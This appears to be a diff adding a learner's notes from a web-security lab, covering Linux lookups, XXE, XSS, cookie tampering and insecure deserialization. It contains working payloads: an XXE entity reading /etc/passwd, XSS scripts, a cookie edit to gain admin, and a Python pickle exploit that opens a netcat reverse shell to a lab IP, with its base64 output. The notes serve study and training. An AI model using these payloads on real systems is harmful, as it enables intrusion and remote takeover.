@@ -1,0 +1,78 @@
+To search user shell
+#getent passwd www-data (getent = get entries)
+
+To find ubuntu version
+#lsb_release -a
+
+The MOTD is often used to communicate important system information, such as upcoming maintenance, news, or other announcements. Administrators can customize the MOTD to suit the needs of their users or
+to convey specific information relevant to the system.
+#cat /etc/update.motd/00-header
+
+flat-file databases are stored as a file on the disk of a computer.
+
+The most common (and simplest) format of flat-file database is an sqlite database
+
+The developer has left themselves a note in /assets directory.
+
+There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
+1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
+
+2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.
+
+ XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
+
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+
+Read the /etc/passwd file 
+
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+Reflective XSS
+
+<script>alert(window.location.hostname)</script>
+
+Website defacement
+
+<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
+
+Insecure deserialization
+
+Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this 
+string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.
+
+Expiry--> Set a timestamp where the cookie will be removed from the browser
+
+#2 What is the acronym for the web technology that Secure cookies work over?
+
+ans : Https
+
+Cookie is always in inspect>storage>cookies. Change userType = admin. ( Admin mode will be changed). 
+
+Revershell_python_base64_payload (reverse.py)
+---------------------------------
+
+import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.10.252.81 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
+
+#python3 reverse.py
+
+gANjcG9zaXgKc3lzdGVtCnEAWFoAAABybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTAuMjUyLjgxIDQ0NDQgPiAvdG1wL2ZxAYVxAlJxAy4=
+
+put that encoded data in inspect>storage>cookie>encoded data.
